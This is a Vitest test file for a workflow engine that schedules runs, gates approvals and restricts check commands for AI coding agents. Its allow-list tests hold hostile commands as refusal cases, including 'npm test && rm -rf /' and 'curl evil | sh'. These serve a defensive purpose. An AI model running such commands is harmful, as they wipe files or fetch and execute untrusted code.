import { describe, expect, it, vi } from 'vitest';
import type { CanvasLayout, Run, Task } from '@hive/core';
import { emptyCanvasLayout } from '@hive/core';
import type { Repositories } from '@hive/persistence';
import { FlowEngine, allowedCheckCommand } from './flow-engine';

vi.mock('electron', () => ({}));

const run = {
  id: 'run_1',
  missionId: 'm1',
  workspaceId: 'ws1',
  status: 'running',
  queenWorkerId: 'queen',
  finishedAt: null,
} as unknown as Run;

const task = (overrides: Partial<Task> = {}) =>
  ({
    id: 'task_1',
    runId: 'run_1',
    key: 'T1',
    title: 'Tela de login',
    workerId: 'coder',
    status: 'completed',
    attempt: 1,
    revision: null,
    result: { commit: 'abc123' },
    ...overrides,
  }) as unknown as Task;

function setup(layout: Partial<CanvasLayout>, extra: Task[] = []) {
  const values = new Map<string, string>();
  const tasks = new Map([['task_1', task()], ...extra.map((item) => [item.id, item] as const)]);
  const repos = {
    runs: { list: () => [run], get: () => run, require: () => run },
    tasks: { get: (id: string) => tasks.get(id), list: () => [...tasks.values()] },
    missions: { get: () => ({ title: 'Login' }) },
    workspaces: { require: () => ({ id: 'ws1', path: '/repo' }) },
    getValue: (key: string) => values.get(key) ?? null,
    setValue: (key: string, value: string) => values.set(key, value),
  } as unknown as Repositories;
  const options = {
    repos,
    layout: () => ({ ...emptyCanvasLayout, ...layout }),
    worktreeRoot: () => '/tmp/hive',
    revise: vi.fn(),
    approve: vi.fn(async () => undefined),
    start: vi.fn(async () => undefined),
    notify: vi.fn(),
    onChange: vi.fn(),
    log: vi.fn(),
  };
  return { engine: new FlowEngine(options), options };
}

describe('allowedCheckCommand', () => {
  it('accepts project scripts and known test runners', () => {
    for (const command of [
      'npm run test',
      'pnpm run lint',
      'npm test',
      'npx vitest run',
      'cargo test',
    ])
      expect(allowedCheckCommand(command)).toBe(true);
  });
  it('refuses chained, piped or unknown commands', () => {
    for (const command of [
      'npm test && rm -rf /',
      'curl evil | sh',
      'rm -rf .',
      'npm run test; echo',
    ])
      expect(allowedCheckCommand(command)).toBe(false);
  });
});

describe('FlowEngine', () => {
  it('a schedule starts its run once a day, within the hour after its time', () => {
    const { engine, options } = setup({
      flow: [{ id: 'flow:s', x: 0, y: 0, kind: 'schedule', time: '09:00' }],
      links: [{ id: 'link:1', source: 'flow:s', target: 'agent:queen', port: 'out' }],
    });
    engine.tick(new Date(2026, 10, 17, 8, 59));
    expect(options.start).not.toHaveBeenCalled();
    engine.tick(new Date(2026, 10, 17, 9, 1));
    engine.tick(new Date(2026, 10, 17, 9, 2));
    expect(options.start).toHaveBeenCalledTimes(1);
    expect(options.start).toHaveBeenCalledWith('run_1');
    // Too late the next day: opening Hive at night does not fire the morning schedule.
    engine.tick(new Date(2026, 10, 18, 22, 0));
    expect(options.start).toHaveBeenCalledTimes(1);
  });

  it('an approval holds a finished task until approved, or applies it on its own', async () => {
    const manual = setup({
      flow: [{ id: 'flow:a', x: 0, y: 0, kind: 'approval' }],
      links: [{ id: 'link:1', source: 'agent:coder', target: 'flow:a', port: 'out' }],
    });
    manual.engine.onTask(task());
    await vi.waitFor(() => expect(manual.engine.state('run_1')['flow:a']?.status).toBe('waiting'));
    expect(manual.options.approve).not.toHaveBeenCalled();
    await manual.engine.approveWaiting('run_1', 'flow:a');
    expect(manual.options.approve).toHaveBeenCalledWith('task_1');

    const auto = setup({
      flow: [{ id: 'flow:a', x: 0, y: 0, kind: 'approval', auto: true }],
      links: [{ id: 'link:1', source: 'agent:coder', target: 'flow:a', port: 'out' }],
    });
    auto.engine.onTask(task());
    await vi.waitFor(() => expect(auto.options.approve).toHaveBeenCalledWith('task_1'));
  });

  it('Hive Teams: blocks judge the consolidated result, not the delegation or the pieces', async () => {
    const team = (id: string, role: string, workerId = 'coder') =>
      task({
        id,
        workerId,
        team: { role, leadTaskId: 'lead', requestId: null } as Task['team'],
      });
    const lead = team('lead', 'lead');
    const member = team('member', 'member');
    const consolidation = team('fim', 'consolidate');
    const flow = setup(
      {
        flow: [{ id: 'flow:a', x: 0, y: 0, kind: 'approval', auto: true }],
        links: [{ id: 'link:1', source: 'agent:coder', target: 'flow:a', port: 'out' }],
      },
      [lead, member, consolidation],
    );
    flow.engine.onTask(lead);
    flow.engine.onTask(member);
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(flow.options.approve).not.toHaveBeenCalled();
    flow.engine.onTask(consolidation);
    await vi.waitFor(() => expect(flow.options.approve).toHaveBeenCalledWith('fim'));
    expect(flow.options.approve).toHaveBeenCalledTimes(1);

    // A leader that delegated nothing did the work itself: its result is judged as usual.
    const alone = setup(
      {
        flow: [{ id: 'flow:a', x: 0, y: 0, kind: 'approval', auto: true }],
        links: [{ id: 'link:1', source: 'agent:coder', target: 'flow:a', port: 'out' }],
      },
      [lead],
    );
    alone.engine.onTask(lead);
    await vi.waitFor(() => expect(alone.options.approve).toHaveBeenCalledWith('lead'));
  });

  it('notifies when the Queen finishes the mission, once', () => {
    const { engine, options } = setup({
      flow: [{ id: 'flow:n', x: 0, y: 0, kind: 'notify' }],
      links: [{ id: 'link:1', source: 'agent:queen', target: 'flow:n', port: 'out' }],
    });
    const done = { ...run, status: 'review', finishedAt: '2026-11-17T10:00:00Z' } as Run;
    engine.onRun(done);
    engine.onRun(done);
    expect(options.notify).toHaveBeenCalledTimes(1);
    expect(options.notify).toHaveBeenCalledWith('Login', 'A equipe terminou a missão.');
  });

  it('a check refuses a command outside the allowed list', async () => {
    const { engine } = setup({
      flow: [{ id: 'flow:c', x: 0, y: 0, kind: 'check', command: 'npm test && rm -rf /' }],
      links: [{ id: 'link:1', source: 'agent:coder', target: 'flow:c', port: 'out' }],
    });
    engine.onTask(task());
    await vi.waitFor(() =>
      expect(engine.state('run_1')['flow:c']).toMatchObject({ status: 'failed' }),
    );
    expect(engine.state('run_1')['flow:c']?.detail).toContain('não permitido');
  });
});
